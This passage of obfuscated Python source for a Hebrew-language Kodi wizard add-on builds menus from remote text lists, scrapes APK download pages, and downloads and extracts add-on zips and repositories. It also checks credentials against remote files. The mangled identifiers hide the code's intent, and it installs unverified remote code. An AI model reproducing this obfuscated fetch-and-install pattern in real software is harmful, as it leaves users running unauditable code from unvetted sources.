			for OO000OOOOOOO0OOOO ,O0O00OOO00OOOO000 ,OO000OO0O000OO0OO ,OOO0OO0000O000O0O ,OOO0OOOOO00O0O000 ,OOO00O00O000000O0 ,OO000O00O00OO0O0O ,O000O0OOOOO0O0000 in O00OO0000O00O0O0O :#line:2037
				if not SHOWADULT =='true'and OO000O00O00OO0O0O .lower ()=='yes':continue #line:2038
				addFile ("[%s] %s v%s"%(OOO0OO0000O000O0O ,OO000OOOOOOO0OOOO ,O0O00OOO00OOOO000 ),'installthird',OO000OOOOOOO0OOOO ,OO000OO0O000OO0OO ,icon =OOO0OOOOO00O0O000 ,fanart =OOO00O00O000000O0 ,description =O000O0OOOOO0O0000 ,themeit =THEME2 )#line:2039
		else :#line:2040
			for OO000OOOOOOO0OOOO ,OO000OO0O000OO0OO ,OOO0OOOOO00O0O000 ,OOO00O00O000000O0 ,O000O0OOOOO0O0000 in O00OO0000O00O0O0O :#line:2041
				addFile (OO000OOOOOOO0OOOO ,'installthird',OO000OOOOOOO0OOOO ,OO000OO0O000OO0OO ,icon =OOO0OOOOO00O0O000 ,fanart =OOO00O00O000000O0 ,description =O000O0OOOOO0O0000 ,themeit =THEME2 )#line:2042
def editThirdParty (OO0OO0O0000O0OOO0 ):#line:2044
	OO00O0000O0OO0O0O =eval ('THIRD%sNAME'%OO0OO0O0000O0OOO0 )#line:2045
	OO000O0OOOO0OO00O =eval ('THIRD%sURL'%OO0OO0O0000O0OOO0 )#line:2046
	OO00OOO00OOOOOOOO =wiz .getKeyboard (OO00O0000O0OO0O0O ,'Enter the Name of the Wizard')#line:2047
	O00OOO0OOO0O00O0O =wiz .getKeyboard (OO000O0OOOO0OO00O ,'Enter the URL of the Wizard Text')#line:2048
	wiz .setS ('wizard%sname'%OO0OO0O0000O0OOO0 ,OO00OOO00OOOOOOOO )#line:2050
	wiz .setS ('wizard%surl'%OO0OO0O0000O0OOO0 ,O00OOO0OOO0O00O0O )#line:2051
def apkScraper (name =""):#line:2053
	if name =='kodi':#line:2054
		O0OO0O0O00O0O0O0O ='http://mirrors.kodi.tv/releases/android/arm/'#line:2055
		OOOO00OO0OO0O0O0O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2056
		OO00O0OOO00000OO0 =wiz .openURL (O0OO0O0O00O0O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2057
		O000OO00OOOOOO000 =wiz .openURL (OOOO00OO0OO0O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2058
		OOOOOO0000000OOOO =0 #line:2059
		OO00O00O0O0OOO0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00O0OOO00000OO0 )#line:2060
		O00O0O00O0OOOO0OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OO00OOOOOO000 )#line:2061
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2063
		OOOO0O0000O0OOOO0 =False #line:2064
		for OO0OOO000OO0O0O0O ,name ,O0OOO00OO0O0OO00O ,OO0OOO0OO000O00O0 in OO00O00O0O0OOO0O0 :#line:2065
			if OO0OOO000OO0O0O0O in ['../','old/']:continue #line:2066
			if not OO0OOO000OO0O0O0O .endswith ('.apk'):continue #line:2067
			if not OO0OOO000OO0O0O0O .find ('_')==-1 and OOOO0O0000O0OOOO0 ==True :continue #line:2068
			try :#line:2069
				O0OO0OO00000O0000 =name .split ('-')#line:2070
				if not OO0OOO000OO0O0O0O .find ('_')==-1 :#line:2071
					OOOO0O0000O0OOOO0 =True #line:2072
					OOO0OO0O0O0O0OO0O ,OO000O0O0000O000O =O0OO0OO00000O0000 [2 ].split ('_')#line:2073
				else :#line:2074
					OOO0OO0O0O0O0OO0O =O0OO0OO00000O0000 [2 ]#line:2075
					OO000O0O0000O000O =''#line:2076
				O0O0OO0O0OO0OOOOO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OO00000O0000 [0 ].title (),O0OO0OO00000O0000 [1 ],OO000O0O0000O000O .upper (),OOO0OO0O0O0O0OO0O ,COLOR2 ,O0OOO00OO0O0OO00O .replace (' ',''),COLOR1 ,OO0OOO0OO000O00O0 )#line:2077
				O0000OOO00000OO00 =urljoin (O0OO0O0O00O0O0O0O ,OO0OOO000OO0O0O0O )#line:2078
				addFile (O0O0OO0O0OO0OOOOO ,'apkinstall',"%s v%s%s %s"%(O0OO0OO00000O0000 [0 ].title (),O0OO0OO00000O0000 [1 ],OO000O0O0000O000O .upper (),OOO0OO0O0O0O0OO0O ),O0000OOO00000OO00 )#line:2079
				OOOOOO0000000OOOO +=1 #line:2080
			except :#line:2081
				wiz .log ("Error on: %s"%name )#line:2082
		for OO0OOO000OO0O0O0O ,name ,O0OOO00OO0O0OO00O ,OO0OOO0OO000O00O0 in O00O0O00O0OOOO0OO :#line:2084
			if OO0OOO000OO0O0O0O in ['../','old/']:continue #line:2085
			if not OO0OOO000OO0O0O0O .endswith ('.apk'):continue #line:2086
			if not OO0OOO000OO0O0O0O .find ('_')==-1 :continue #line:2087
			try :#line:2088
				O0OO0OO00000O0000 =name .split ('-')#line:2089
				O0O0OO0O0OO0OOOOO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0OO00000O0000 [0 ].title (),O0OO0OO00000O0000 [1 ],O0OO0OO00000O0000 [2 ],COLOR2 ,O0OOO00OO0O0OO00O .replace (' ',''),COLOR1 ,OO0OOO0OO000O00O0 )#line:2090
				O0000OOO00000OO00 =urljoin (OOOO00OO0OO0O0O0O ,OO0OOO000OO0O0O0O )#line:2091
				addFile (O0O0OO0O0OO0OOOOO ,'apkinstall',"%s v%s %s"%(O0OO0OO00000O0000 [0 ].title (),O0OO0OO00000O0000 [1 ],O0OO0OO00000O0000 [2 ]),O0000OOO00000OO00 )#line:2092
				OOOOOO0000000OOOO +=1 #line:2093
			except :#line:2094
				wiz .log ("Error on: %s"%name )#line:2095
		if OOOOOO0000000OOOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2096
	elif name =='spmc':#line:2097
		OO0OO0OOOOOOO0OO0 ='https://github.com/koying/SPMC/releases'#line:2098
		OO00O0OOO00000OO0 =wiz .openURL (OO0OO0OOOOOOO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2099
		OOOOOO0000000OOOO =0 #line:2100
		OO00O00O0O0OOO0O0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO00O0OOO00000OO0 )#line:2101
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2103
		for name ,O000O0O00OO0O00O0 in OO00O00O0O0OOO0O0 :#line:2105
			OO0OO00000O0O0OOO =''#line:2106
			O00O0O00O0OOOO0OO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O000O0O00OO0O00O0 )#line:2107
			for OO0O0OO0O00OO00O0 ,OOOOO00OO0O00O0O0 ,OOOO0O0O00O00O0O0 in O00O0O00O0OOOO0OO :#line:2108
				if OOOO0O0O00O00O0O0 .find ('armeabi')==-1 :continue #line:2109
				if OOOO0O0O00O00O0O0 .find ('launcher')>-1 :continue #line:2110
				OO0OO00000O0O0OOO =urljoin ('https://github.com',OO0O0OO0O00OO00O0 )#line:2111
				break #line:2112
		if OOOOOO0000000OOOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2114
def apkMenu (url =None ):#line:2116
	if url ==None :#line:2117
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2120
	if not APKFILE =='http://':#line:2121
		if url ==None :#line:2122
			O0OO0OOOO0O00O00O =wiz .workingURL (APKFILE )#line:2123
			OO0OOO0000000OOOO =uservar .APKFILE #line:2124
		else :#line:2125
			O0OO0OOOO0O00O00O =wiz .workingURL (url )#line:2126
			OO0OOO0000000OOOO =url #line:2127
		if O0OO0OOOO0O00O00O ==True :#line:2128
			OO000OOO0O0O00OO0 =wiz .openURL (OO0OOO0000000OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2129
			OOOOO00000OOOOO00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO000OOO0O0O00OO0 )#line:2130
			if len (OOOOO00000OOOOO00 )>0 :#line:2131
				O0O00OOOOOOO00000 =0 #line:2132
				for OOO0O0O00OO0OO0OO ,OOOOO000O000O0000 ,url ,O000O0OOOOOOO0O0O ,O00OOOO0OO00O0000 ,O0OO00OO0OO0OO0O0 ,O0O0000O0000O0O00 in OOOOO00000OOOOO00 :#line:2133
					if not SHOWADULT =='true'and O0OO00OO0OO0OO0O0 .lower ()=='yes':continue #line:2134
					if OOOOO000O000O0000 .lower ()=='yes':#line:2135
						O0O00OOOOOOO00000 +=1 #line:2136
						addDir ("[B]%s[/B]"%OOO0O0O00OO0OO0OO ,'apk',url ,description =O0O0000O0000O0O00 ,icon =O000O0OOOOOOO0O0O ,fanart =O00OOOO0OO00O0000 ,themeit =THEME3 )#line:2137
					else :#line:2138
						O0O00OOOOOOO00000 +=1 #line:2139
						addFile (OOO0O0O00OO0OO0OO ,'apkinstall',OOO0O0O00OO0OO0OO ,url ,description =O0O0000O0000O0O00 ,icon =O000O0OOOOOOO0O0O ,fanart =O00OOOO0OO00O0000 ,themeit =THEME2 )#line:2140
					if O0O00OOOOOOO00000 <1 :#line:2141
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2142
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2143
		else :#line:2144
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2145
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2146
			addFile ('%s'%O0OO0OOOO0O00O00O ,'',themeit =THEME3 )#line:2147
		return #line:2148
	else :wiz .log ("[APK Menu] No APK list added.")#line:2149
	setView ('files','viewType')#line:2150
def addonMenu (url =None ):#line:2152
	if not ADDONFILE =='http://':#line:2153
		if url ==None :#line:2154
			OO0O00OO00O00OO0O =wiz .workingURL (ADDONFILE )#line:2155
			OOOO0O0O000O0000O =uservar .ADDONFILE #line:2156
		else :#line:2157
			OO0O00OO00O00OO0O =wiz .workingURL (url )#line:2158
			OOOO0O0O000O0000O =url #line:2159
		if OO0O00OO00O00OO0O ==True :#line:2160
			OO00OO0O00O00O00O =wiz .openURL (OOOO0O0O000O0000O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2161
			OOO0OO0OO0O00O000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00OO0O00O00O00O )#line:2162
			if len (OOO0OO0OO0O00O000 )>0 :#line:2163
				OO0O0OOOO000OOOO0 =0 #line:2164
				for OO00O00O00OO0OOOO ,OO0000O0OOOO0O0O0 ,url ,O0O000OOOOO0O0OO0 ,O00O00OOOOO0O0O00 ,OOO00000OOOOO0OO0 ,OOOOO00OOOOO00000 ,OOO0OO0O0000OO000 ,OOO000000OOO0OO0O ,O00OOO000O00OO0OO in OOO0OO0OO0O00O000 :#line:2165
					if OO0000O0OOOO0O0O0 .lower ()=='section':#line:2166
						OO0O0OOOO000OOOO0 +=1 #line:2167
						addDir ("[B]%s[/B]"%OO00O00O00OO0OOOO ,'addons',url ,description =O00OOO000O00OO0OO ,icon =OOOOO00OOOOO00000 ,fanart =OOO0OO0O0000OO000 ,themeit =THEME3 )#line:2168
					else :#line:2169
						if not SHOWADULT =='true'and OOO000000OOO0OO0O .lower ()=='yes':continue #line:2170
						try :#line:2171
							O0O0OO00O00O0000O =xbmcaddon .Addon (id =OO0000O0OOOO0O0O0 ).getAddonInfo ('path')#line:2172
							if os .path .exists (O0O0OO00O00O0000O ):#line:2173
								OO00O00O00OO0OOOO ="[COLOR green][Installed][/COLOR] %s"%OO00O00O00OO0OOOO #line:2174
						except :#line:2175
							pass #line:2176
						OO0O0OOOO000OOOO0 +=1 #line:2177
						addFile (OO00O00O00OO0OOOO ,'addoninstall',OO0000O0OOOO0O0O0 ,OOOO0O0O000O0000O ,description =O00OOO000O00OO0OO ,icon =OOOOO00OOOOO00000 ,fanart =OOO0OO0O0000OO000 ,themeit =THEME2 )#line:2178
					if OO0O0OOOO000OOOO0 <1 :#line:2179
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2180
			else :#line:2181
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2182
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2183
		else :#line:2184
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2185
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2186
			addFile ('%s'%OO0O00OO00O00OO0O ,'',themeit =THEME3 )#line:2187
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2188
	setView ('files','viewType')#line:2189
def addonInstaller (O0OOOOOOO0000O00O ,OO000O00000OO0000 ):#line:2191
	if not ADDONFILE =='http://':#line:2192
		OOO000O00000OOO00 =wiz .workingURL (OO000O00000OO0000 )#line:2193
		if OOO000O00000OOO00 ==True :#line:2194
			O0OO000OO0O0OO0OO =wiz .openURL (OO000O00000OO0000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2195
			OO0O000000O00OOO0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OOOOOOO0000O00O ).findall (O0OO000OO0O0OO0OO )#line:2196
			if len (OO0O000000O00OOO0 )>0 :#line:2197
				for OOO00OOOOOOOOOOOO ,OO000O00000OO0000 ,O0O0O0OO0OOO0OO00 ,O0OOO0O000O0O000O ,OOOOO0000OO0000O0 ,OOO0000O00000OO00 ,OO0O0OOO00O0OOOOO ,OO00000O0O00O0OOO ,OOOOOO00OOO0O0OO0 in OO0O000000O00OOO0 :#line:2198
					if os .path .exists (os .path .join (ADDONS ,O0OOOOOOO0000O00O )):#line:2199
						O0OOO00O0O0OO0O0O =['Launch Addon','Remove Addon']#line:2200
						OOO0000OO000000OO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0OOO00O0O0OO0O0O )#line:2201
						if OOO0000OO000000OO ==0 :#line:2202
							wiz .ebi ('RunAddon(%s)'%O0OOOOOOO0000O00O )#line:2203
							xbmc .sleep (1000 )#line:2204
							return True #line:2205
						elif OOO0000OO000000OO ==1 :#line:2206
							wiz .cleanHouse (os .path .join (ADDONS ,O0OOOOOOO0000O00O ))#line:2207
							try :wiz .removeFolder (os .path .join (ADDONS ,O0OOOOOOO0000O00O ))#line:2208
							except :pass #line:2209
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0OOOOOOO0000O00O ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2210
								removeAddonData (O0OOOOOOO0000O00O )#line:2211
							wiz .refresh ()#line:2212
							return True #line:2213
						else :#line:2214
							return False #line:2215
					O000OO000000O00OO =os .path .join (ADDONS ,O0O0O0OO0OOO0OO00 )#line:2216
					if not O0O0O0OO0OOO0OO00 .lower ()=='none'and not os .path .exists (O000OO000000O00OO ):#line:2217
						wiz .log ("Repository not installed, installing it")#line:2218
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O0OOOOOOO0000O00O ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O0O0O0OO0OOO0OO00 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2219
							O0O00OOOO0000O00O =wiz .parseDOM (wiz .openURL (O0OOO0O000O0O000O ),'addon',ret ='version',attrs ={'id':O0O0O0OO0OOO0OO00 })#line:2220
							if len (O0O00OOOO0000O00O )>0 :#line:2221
								OOO0OOOO0000OO000 ='%s%s-%s.zip'%(OOOOO0000OO0000O0 ,O0O0O0OO0OOO0OO00 ,O0O00OOOO0000O00O [0 ])#line:2222
								wiz .log (OOO0OOOO0000OO000 )#line:2223
								if KODIV >=17 :wiz .addonDatabase (O0O0O0OO0OOO0OO00 ,1 )#line:2224
								installAddon (O0O0O0OO0OOO0OO00 ,OOO0OOOO0000OO000 )#line:2225
								wiz .ebi ('UpdateAddonRepos()')#line:2226
								wiz .log ("Installing Addon from Kodi")#line:2228
								OO0OO0O0O00OO0OOO =installFromKodi (O0OOOOOOO0000O00O )#line:2229
								wiz .log ("Install from Kodi: %s"%OO0OO0O0O00OO0OOO )#line:2230
								if OO0OO0O0O00OO0OOO :#line:2231
									wiz .refresh ()#line:2232
									return True #line:2233
							else :#line:2234
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%O0O0O0OO0OOO0OO00 )#line:2235
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O0OOOOOOO0000O00O ,O0O0O0OO0OOO0OO00 ))#line:2236
					elif O0O0O0OO0OOO0OO00 .lower ()=='none':#line:2237
						wiz .log ("No repository, installing addon")#line:2238
						O0000000OOOO0OO00 =O0OOOOOOO0000O00O #line:2239
						O00O000O00O000000 =OO000O00000OO0000 #line:2240
						installAddon (O0OOOOOOO0000O00O ,OO000O00000OO0000 )#line:2241
						wiz .refresh ()#line:2242
						return True #line:2243
					else :#line:2244
						wiz .log ("Repository installed, installing addon")#line:2245
						OO0OO0O0O00OO0OOO =installFromKodi (O0OOOOOOO0000O00O ,False )#line:2246
						if OO0OO0O0O00OO0OOO :#line:2247
							wiz .refresh ()#line:2248
							return True #line:2249
					if os .path .exists (os .path .join (ADDONS ,O0OOOOOOO0000O00O )):return True #line:2250
					O0OOO0O00O0000OO0 =wiz .parseDOM (wiz .openURL (O0OOO0O000O0O000O ),'addon',ret ='version',attrs ={'id':O0OOOOOOO0000O00O })#line:2251
					if len (O0OOO0O00O0000OO0 )>0 :#line:2252
						OO000O00000OO0000 ="%s%s-%s.zip"%(OO000O00000OO0000 ,O0OOOOOOO0000O00O ,O0OOO0O00O0000OO0 [0 ])#line:2253
						wiz .log (str (OO000O00000OO0000 ))#line:2254
						if KODIV >=17 :wiz .addonDatabase (O0OOOOOOO0000O00O ,1 )#line:2255
						installAddon (O0OOOOOOO0000O00O ,OO000O00000OO0000 )#line:2256
						wiz .refresh ()#line:2257
					else :#line:2258
						wiz .log ("no match");return False #line:2259
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2260
		else :wiz .log ("[Addon Installer] Text File: %s"%OOO000O00000OOO00 )#line:2261
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2262
def installFromKodi (O0O0OO0OO0O00OOOO ,over =True ):#line:2264
	if over ==True :#line:2265
		xbmc .sleep (2000 )#line:2266
	wiz .ebi ('RunPlugin(plugin://%s)'%O0O0OO0OO0O00OOOO )#line:2268
	if not wiz .whileWindow ('yesnodialog'):#line:2269
		return False #line:2270
	xbmc .sleep (1000 )#line:2271
	if wiz .whileWindow ('okdialog'):#line:2272
		return False #line:2273
	wiz .whileWindow ('progressdialog')#line:2274
	if os .path .exists (os .path .join (ADDONS ,O0O0OO0OO0O00OOOO )):return True #line:2275
	else :return False #line:2276
def installAddon (OOOO0O0O000OOOOO0 ,O00OOOOO00O00000O ):#line:2278
	if not wiz .workingURL (O00OOOOO00O00000O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,OOOO0O0O000OOOOO0 ,COLOR2 ));return #line:2279
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2280
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O0O000OOOOO0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2281
	OOOOOO00O0OO0OO0O =O00OOOOO00O00000O .split ('/')#line:2282
	OOOO000O0OOO0OOOO =os .path .join (PACKAGES ,OOOOOO00O0OO0OO0O [-1 ])#line:2283
	try :os .remove (OOOO000O0OOO0OOOO )#line:2284
	except :pass #line:2285
	downloader .download (O00OOOOO00O00000O ,OOOO000O0OOO0OOOO ,DP )#line:2286
	O00000O000000O0O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOO0O0O000OOOOO0 )#line:2287
	DP .update (0 ,O00000O000000O0O0 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2288
	OO00OOO0OO0OO000O ,OO0000OO000OOOOOO ,O000000O00O0O00O0 =extract .all (OOOO000O0OOO0OOOO ,ADDONS ,DP ,title =O00000O000000O0O0 )#line:2289
	DP .update (0 ,O00000O000000O0O0 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2290
	installed (OOOO0O0O000OOOOO0 )#line:2291
	installDep (OOOO0O0O000OOOOO0 ,DP )#line:2292
	DP .close ()#line:2293
	wiz .ebi ('UpdateAddonRepos()')#line:2294
	wiz .ebi ('UpdateLocalAddons()')#line:2295
	wiz .refresh ()#line:2296
def installDep (O00O0O00O000OO0OO ,DP =None ):#line:2298
	OOO0OOO0O0O00OO00 =os .path .join (ADDONS ,O00O0O00O000OO0OO ,'addon.xml')#line:2299
	if os .path .exists (OOO0OOO0O0O00OO00 ):#line:2300
		OOOO0000OO0OOO00O =open (OOO0OOO0O0O00OO00 ,mode ='r');O0O0OOOO00O0OO0O0 =OOOO0000OO0OOO00O .read ();OOOO0000OO0OOO00O .close ();#line:2301
		O00OO0OOOO0OO000O =wiz .parseDOM (O0O0OOOO00O0OO0O0 ,'import',ret ='addon')#line:2302
		for OOOOO0O00OO00OOO0 in O00OO0OOOO0OO000O :#line:2303
			if not 'xbmc.python'in OOOOO0O00OO00OOO0 :#line:2304
				if not DP ==None :#line:2305
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOO0O00OO00OOO0 ))#line:2306
				wiz .createTemp (OOOOO0O00OO00OOO0 )#line:2307
def installed (O00OOO000O0O0OOO0 ):#line:2334
	O0O0OO000O0O00000 =os .path .join (ADDONS ,O00OOO000O0O0OOO0 ,'addon.xml')#line:2335
	if os .path .exists (O0O0OO000O0O00000 ):#line:2336
		try :#line:2337
			OO000000OOO00OO00 =open (O0O0OO000O0O00000 ,mode ='r');O0OOOOO0OO0O00O0O =OO000000OOO00OO00 .read ();OO000000OOO00OO00 .close ()#line:2338
			O00000OOO0O00OO0O =wiz .parseDOM (O0OOOOO0OO0O00O0O ,'addon',ret ='name',attrs ={'id':O00OOO000O0O0OOO0 })#line:2339
			O0O00O000O0OOOOOO =os .path .join (ADDONS ,O00OOO000O0O0OOO0 ,'icon.png')#line:2340
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00000OOO0O00OO0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O0O00O000O0OOOOOO )#line:2341
		except :pass #line:2342
def youtubeMenu (url =None ):#line:2344
	if not YOUTUBEFILE =='http://':#line:2345
		if url ==None :#line:2346
			OOOOO0O0O00OOOOOO =wiz .workingURL (YOUTUBEFILE )#line:2347
			O0OOO00O0OO0O0O0O =uservar .YOUTUBEFILE #line:2348
		else :#line:2349
			OOOOO0O0O00OOOOOO =wiz .workingURL (url )#line:2350
			O0OOO00O0OO0O0O0O =url #line:2351
		if OOOOO0O0O00OOOOOO ==True :#line:2352
			OOO00O0000O00OO0O =wiz .openURL (O0OOO00O0OO0O0O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2353
			OOOOO0O0O0O0O00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOO00O0000O00OO0O )#line:2354
			if len (OOOOO0O0O0O0O00OO )>0 :#line:2355
				for O0O0000OOOOOOO000 ,OOOOO0OOO0OOOOO0O ,url ,OO0OO0O00OOOOO000 ,OO00O0OO0OO0O0OO0 ,OO0OOO0OO0OOO0OOO in OOOOO0O0O0O0O00OO :#line:2356
					if OOOOO0OOO0OOOOO0O .lower ()=="yes":#line:2357
						addDir ("[B]%s[/B]"%O0O0000OOOOOOO000 ,'youtube',url ,description =OO0OOO0OO0OOO0OOO ,icon =OO0OO0O00OOOOO000 ,fanart =OO00O0OO0OO0O0OO0 ,themeit =THEME3 )#line:2358
					else :#line:2359
						addFile (O0O0000OOOOOOO000 ,'viewVideo',url =url ,description =OO0OOO0OO0OOO0OOO ,icon =OO0OO0O00OOOOO000 ,fanart =OO00O0OO0OO0O0OO0 ,themeit =THEME2 )#line:2360
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2361
		else :#line:2362
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2363
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2364
			addFile ('%s'%OOOOO0O0O00OOOOOO ,'',themeit =THEME3 )#line:2365
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2366
	setView ('files','viewType')#line:2367
def STARTP ():#line:2368
	O0OOOOOOO000000OO =(ADDON .getSetting ("pass"))#line:2369
	if BUILDNAME =="":#line:2370
	 if not NOTIFY =='true':#line:2371
          O000O0000O0O0O000 =wiz .workingURL (NOTIFICATION )#line:2372
	 if not NOTIFY2 =='true':#line:2373
          O000O0000O0O0O000 =wiz .workingURL (NOTIFICATION2 )#line:2374
	 if not NOTIFY3 =='true':#line:2375
          O000O0000O0O0O000 =wiz .workingURL (NOTIFICATION3 )#line:2376
	OOOO00OO00OO0OO00 =O0OOOOOOO000000OO #line:2377
	O000O0000O0O0O000 =urllib2 .Request (SPEED )#line:2378
	O0000000O0O0O0000 =urllib2 .urlopen (O000O0000O0O0O000 )#line:2379
	O00O0OO00O0O000O0 =O0000000O0O0O0000 .read ()#line:2380
	if O0OOOOOOO000000OO ==OOOO00OO00OO0OO00 :#line:2381
				O000O0000O0O0O000 =list #line:2382
				if OOOO00OO00OO0OO00 !=O00O0OO00O0O000O0 :#line:2383
					OOOOO00000OO0OOOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2384
					if OOOOO00000OO0OOOO :#line:2386
						ADDON .openSettings ()#line:2388
						STARTP ()#line:2389
						sys .exit ()#line:2390
					else :#line:2391
						sys .exit ()#line:2392
	return 'ok'#line:2396
def STARTP2 ():#line:2397
	O0O0000O0OOO0OOO0 =(ADDON .getSetting ("user"))#line:2398
	O0OOO0O00O00OO0O0 =(UNAME )#line:2400
	O0O0OOO00OOOO00O0 =urllib2 .urlopen (O0OOO0O00O00OO0O0 )#line:2401
	OOOO0OOOOO0OOOO0O =O0O0OOO00OOOO00O0 .readlines ()#line:2402
	if not O0O0000O0OOO0OOO0 +'\r\n'in OOOO0OOOOO0OOOO0O :#line:2405
		O00OOO0O00OO0O00O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2407
		if O00OOO0O00OO0O00O :#line:2409
			ADDON .openSettings ()#line:2411
			STARTP2 ()#line:2413
			sys .exit ()#line:2414
		else :#line:2415
			sys .exit ()#line:2416
	return 'ok'#line:2420
def passandpin ():#line:2421
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2422
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2423
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2424
def passandUsername ():#line:2425
	ADDON .openSettings ()#line:2426
def folderback ():#line:2429
    OOOO0O0O0OO0O00OO =ADDON .getSetting ("path")#line:2430
    if OOOO0O0O0OO0O00OO :#line:2431
      OOOO0O0O0OO0O00OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2432
      ADDON .setSetting ("path",OOOO0O0O0OO0O00OO )#line:2433
def backmyupbuild ():#line:2436
